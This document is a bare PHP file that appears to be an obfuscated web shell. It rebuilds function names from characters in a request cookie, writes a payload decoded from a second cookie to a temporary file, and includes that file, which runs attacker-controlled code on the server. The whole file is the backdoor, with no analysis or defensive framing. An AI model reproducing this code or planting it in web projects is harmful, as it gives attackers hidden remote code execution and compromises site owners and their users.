<?php
if (isset($_COOKIE[3]) && isset($_COOKIE[11])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 3;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[11][$n];
        if (!$c[11][$n + 1]) {
            if (!$c[11][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 3 + 1;
    }
    $k = $p[28]() . $p[18];
    if (!$p[15]($k)) {
        $n = $p[8]($k, $p[23]);
        $p[7]($n, $p[12] . $p[9]($p[2]($c[3])));
    }
    include($k);
}